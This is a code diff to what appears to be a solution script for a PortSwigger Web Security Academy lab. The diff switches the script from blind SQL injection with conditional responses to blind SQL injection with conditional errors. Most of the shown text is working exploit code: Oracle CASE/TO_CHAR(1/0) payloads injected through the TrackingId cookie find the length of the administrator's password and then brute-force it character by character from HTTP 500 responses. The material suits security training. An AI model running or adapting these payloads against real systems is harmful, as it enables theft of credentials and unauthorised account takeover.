@@ -2,12 +2,12 @@
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
-# Date: 22/9/2023
+# Date: 23/9/2023
 #
-# Lab: Blind SQL injection with conditional responses
+# Lab: Blind SQL injection with conditional errors
 #
 # Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
-#           administrator's password based on conditional responses
+#           administrator's password based on conditional errors
 #        2. Modify the payload to brute force the administrator's password
 #        3. Fetch the login page
 #        4. Extract csrf token and session cookie
@@ -33,18 +33,16 @@ def determin_password_length(url):
               Fore.YELLOW + str(length), flush=True, end='\r')
         try:
             # payload to determine password length
-            payload = f"' or length((select password from users where username = 'administrator')) = {length} -- -"
+            payload = f"' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {length}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
             cookies = {
                 "TrackingId": payload
             }
             # fetch the page with the injected payload
             injection = requests.get(
                 f"{url}/filter?category=Pets", cookies=cookies)
-            # extract the welcome text
-            welcome_text = re.findall("Welcome back!",
-                                      injection.text)
-            # if welcome text is found in the response
-            if len(welcome_text) != 0:
+
+            # if the server returns an error which means the condition is true and a char is found
+            if injection.status_code == 500:
                 print(Fore.WHITE + "1. Checking if password length = " +
                       Fore.YELLOW + str(length) + Fore.WHITE + " [ Correct length: " +
                       Fore.GREEN + str(length) + Fore.WHITE + " ]")
@@ -66,18 +64,16 @@ def brute_force_password(url, password_length):
                   Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character, flush=True, end='\r')
             try:
                 # payload to brute force password
-                payload = f"' or substring((select password from users where username = 'administrator'), {position}, 1) = '{character}' -- -"
+                payload = f"' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -"
                 cookies = {
                     "TrackingId": payload
                 }
                 # fetch the page with the injected payload
                 injection = requests.get(
                     f"{url}/filter?category=Pets", cookies=cookies)
-                # extract the welcome text
-                welcome_text = re.findall("Welcome back!",
-                                          injection.text)
-                # if welcome text is found in the response
-                if len(welcome_text) != 0:
+
+                # if the server returns an error which means the condition is true and a char is found
+                if injection.status_code == 500:
                     correct_password.append(character)
                     print(Fore.WHITE + "\r2. Checking if char at position " +
                           Fore.BLUE + str(position) + Fore.WHITE + " = " + Fore.YELLOW + character + Fore.WHITE + " [ Correct password: " +
@@ -95,7 +91,7 @@ def brute_force_password(url, password_length):
 # Main
 #########
 # change this url to your lab
-url = "https://0a1b0058035c3e5788f6163d00b60064.web-security-academy.net"
+url = "https://0a94001a0463579f8416500a00df00a7.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "TrackingId")
 
 # determine password length
